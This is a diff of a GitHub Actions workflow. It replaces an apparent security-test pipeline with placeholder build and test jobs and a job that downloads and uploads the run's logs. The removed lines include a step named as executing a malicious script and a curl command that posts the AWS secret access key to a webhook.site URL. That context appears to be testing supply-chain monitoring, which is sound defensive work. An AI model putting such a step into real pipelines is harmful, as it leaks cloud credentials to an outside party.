@@ -1,45 +1,65 @@
-name: Python Project (short workflow STAGE BASELINE)
+name: Workflow with Log Download
 
-on:
-  workflow_dispatch:
+on: [push, pull_request, workflow_dispatch]
 
 permissions:
-  checks: write
-  contents: write
-  packages: read
+  contents: read   # Usually needed for actions/checkout
+  actions: read    # Required for gh run view --log
 
 jobs:
-  python-application-build:
+  # --- Your Existing Jobs ---
+  # Example: build job
+  build:
     runs-on: ubuntu-latest
-    name: Run build
     steps:
-      - name: Setup PSE
-        uses: invisirisk/pse-action@dev-test
-        with:
-          api_url: "https://app.stage.invisirisk.com"
-          app_token: ${{ secrets.IR_API_KEY }}
-          
       - uses: actions/checkout@v4
-
-      - name: Use Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: "3.13"
-
-      - name: Install dependencies
-        run: pip install -r requirements.txt
-
-      - name: 😈 Execute malicious script
-        run: bash run_malicious_scripts.sh
-
-      - name: Send AWS Secret via Webhook (test)
+      - name: Run build steps
         run: |
-         curl -X POST "https://webhook.site/59c8292c-2297-4149-ac29-c02bec44a27a" \
-           --data-urlencode "aws_secret_access_key=${{ secrets.AWS_SECRET_ACCESS_KEY }}"
+          echo "Building the project..."
+          echo "This is a log from the build job."
+          # Your build commands
 
+  # Example: test job (depends on build)
+  test:
+    runs-on: ubuntu-latest
+    needs: build # Ensures test runs after build
+    steps:
+      - name: Run tests
+        run: |
+          echo "Running tests..."
+          echo "This is a log from the test job."
+          # Your test commands
 
-      - name: Cleanup PSE
-        if: always()
-        uses: invisirisk/pse-action@dev-test
+  # --- Job to Capture and Upload Logs ---
+  capture_and_upload_workflow_logs:
+    runs-on: ubuntu-latest
+    # 'needs' should list all final operational jobs in your workflow
+    needs: [build, test] # Adjust this based on your workflow's structure
+    if: always() # This ensures this job runs even if previous jobs fail
+    name: Capture Workflow Logs
+    steps:
+      - name: Get workflow run logs
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} # Provided by GitHub Actions
+          RUN_ID: ${{ github.run_id }}
+        run: |
+          echo "Fetching logs for workflow run ID: $RUN_ID"
+          # Ensure gh CLI is available (it is on GitHub-hosted runners by default)
+          gh version
+          
+          # Attempt to fetch the logs. If it fails, create an empty file with an error message.
+          gh run view $RUN_ID --log > workflow_run_logs_${RUN_ID}.log || \
+            echo "Failed to fetch logs using 'gh run view'. Log file may be incomplete or empty." > workflow_run_logs_${RUN_ID}.log
+          
+          echo "Log capture complete. File created: workflow_run_logs_${RUN_ID}.log"
+          echo "First 10 lines of the log file:"
+          head -n 10 workflow_run_logs_${RUN_ID}.log
+          ls -lh workflow_run_logs_${RUN_ID}.log
+
+      - name: Upload full workflow log
+        uses: actions/upload-artifact@v4
         with:
-          cleanup: "true"
+          name: complete-workflow-log-${{ github.run_id }}
+          path: workflow_run_logs_${{ github.run_id }}.log
+          if-no-files-found: warn # 'warn', 'error', or 'ignore'
+          retention-days: 7 # Optional: set retention period for the artifact
